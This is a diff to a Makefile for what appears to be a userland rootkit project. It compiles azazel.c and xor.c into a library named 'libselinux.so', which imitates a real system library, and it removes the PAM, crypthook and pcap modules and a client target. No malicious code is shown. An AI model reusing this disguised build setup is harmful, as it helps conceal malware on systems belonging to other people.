@@ -1,19 +1,16 @@
 INSTALL=/lib
 
 CFLAGS+= -Wall
-LDFLAGS+= -lc -ldl -lpam -lutil
+LDFLAGS+= -lc -ldl -lutil
 
 all: config libselinux.so
-
-client:
-	$(CC) -fPIC client.c -shared -o client.so
 
 config:
 	@python config.py > const.h
 
-libselinux.so: azazel.c pam.c xor.c crypthook.c pcap.c
-	$(CC) -fPIC -g -c azazel.c pam.c xor.c crypthook.c pcap.c
-	$(CC) -fPIC -shared -Wl,-soname,libselinux.so azazel.o xor.o pam.o crypthook.o pcap.o $(LDFLAGS) -o libselinux.so
+libselinux.so: azazel.c 
+	$(CC) -fPIC -g -c azazel.c xor.c
+	$(CC) -fPIC -shared -Wl,-soname,libselinux.so azazel.o xor.o  $(LDFLAGS) -o libselinux.so
 	strip libselinux.so
 
 install: all
